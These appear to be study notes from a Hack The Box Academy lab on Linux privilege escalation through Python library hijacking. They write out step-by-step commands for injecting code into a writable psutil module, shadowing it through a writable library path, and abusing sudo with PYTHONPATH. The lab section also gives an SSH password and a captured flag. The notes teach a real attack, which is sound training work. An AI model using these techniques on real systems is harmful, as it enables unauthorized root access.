# Python Library Hijacking

Common Python libraries :

https://numpy.org/doc/stable/
https://pandas.pydata.org/docs/
https://docs.python.org/3/library/

## Importing Modules

```
#!/usr/bin/env python3

# Method 1
import pandas

# Method 2
from pandas import *

# Method 3
from pandas import Series
```

3 basic vulnerabilities where hijacking can be used:
1. Wrong write permissions
2. Library Path
3. PYTHONPATH environment variable

## Wrong Write Permissions

Python Script

1) Check wich modules are called in the python script

ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py

cat mem_status.py

#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")

2) Check module permissions

grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():

ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

3) Check module contents

cat /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...


4) Module Contents - Hijacking : insert malicious code at the beginning

vi cat /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...

5) Privilege Escalation

sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%

## Library Path

In Python, each version has a specified order in which libraries (modules) are searched and imported from.

1) PYTHONPATH Listing

python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages

2 prerequisites are necessary :

- The module that is imported by the script is located under one of the lower priority paths listed via the PYTHONPATH variable.
- We must have write permissions to one of the paths having a higher priority on the list.

2) Psutil Default Installation Location

pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...

3) Check if there are misconfigured Directory Permissions

ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...


--> /usr/lib/python3.8 path is misconfigured in a way to allow any user to write to it

4) Hijacked Module Contents - psutil.py

Create our own psutil module containing our own malicious virtual_memory() function within the /usr/lib/python3.8 directory

vi /usr/lib/python3.8/psutil.py

#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')

5) Privilege Escalation via Hijacking Python Library Path

sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 

## PYTHONPATH Environment Variable

PYTHONPATH is an environment variable that indicates what directory (or directories) Python can search for modules to import.

1) Checking sudo permissions

sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3

2) Privilege Escalation using PYTHONPATH Environment Variable

vi /tmp/psutil.py

#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')

sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...


## LAB

ssh htb-student@10.129.8.117
HTB_@cademy_stdnt!

ls -l
total 4
-rwSrwxr-x 1 root root 192 May 19  2023 mem_status.py

sudo -l 
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py

cat mem_status.py 
#!/usr/bin/env python3
import psutil 

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")



vi /tmp/psutil.py

#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('cat /root/flag.txt')

sudo PYTHONPATH=/home/htb-student/ /usr/bin/python3 /home/htb-student/mem_status.py
sudo: sorry, you are not allowed to set the following environment variables: PYTHONPATH

sudo /usr/bin/python3 /home/htb-student/mem_status.py

HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
Traceback (most recent call last):
  File "/home/htb-student/mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available'
